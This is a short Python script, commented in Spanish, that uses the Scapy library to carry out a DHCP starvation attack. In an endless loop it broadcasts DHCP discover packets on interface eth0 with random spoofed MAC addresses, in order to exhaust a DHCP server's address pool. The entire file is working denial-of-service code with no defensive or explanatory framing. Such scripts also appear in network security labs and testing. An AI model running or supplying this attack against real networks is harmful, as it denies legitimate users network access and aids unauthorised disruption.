from scapy.all import *

def starvation():
    print("Iniciando DHCP Starvation...")
    conf.checkIPaddr = False
    while True:
        fake_mac = RandMAC()
        xid_random = random.randint(1, 900000000)
        
        pkt = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / \
              IP(src="0.0.0.0", dst="255.255.255.255") / \
              UDP(sport=68, dport=67) / \
              BOOTP(chaddr=fake_mac, xid=xid_random) / \
              DHCP(options=[("message-type", "discover"), "end"])
        
        sendp(pkt, iface="eth0", verbose=0)

if __name__ == "__main__":
    starvation()
